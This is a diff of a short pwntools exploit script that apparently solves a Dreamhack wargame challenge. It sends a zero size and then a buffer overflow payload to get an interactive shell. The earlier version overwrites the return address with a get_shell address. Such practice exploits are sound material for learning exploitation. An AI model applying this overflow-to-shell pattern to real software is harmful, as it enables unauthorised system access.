@@ -1,16 +1,17 @@
 from pwn import *
 context.log_level='debug'
 
-n = remote('host1.dreamhack.games',8367)
+hosts = 'host1.dreamhack.games'
+port = 20798
 
-get_shell_addr = 0x08048659
+p = remote(hosts,port)
 
-payload1 = '0'
-payload2 = b'A'*0x104
-payload2 += b'B'*0x4
-payload2 += p32(get_shell_addr)
+size = '0'
+payload = b'A'*0x108
 
-n.sendafter('Size:',payload1)
-n.send(payload2)
+p.recvuntil('Size: ')
+p.sendline(size)
+p.recvuntil('Data: ')
+p.send(payload)
 
-n.interactive()
+p.interactive()
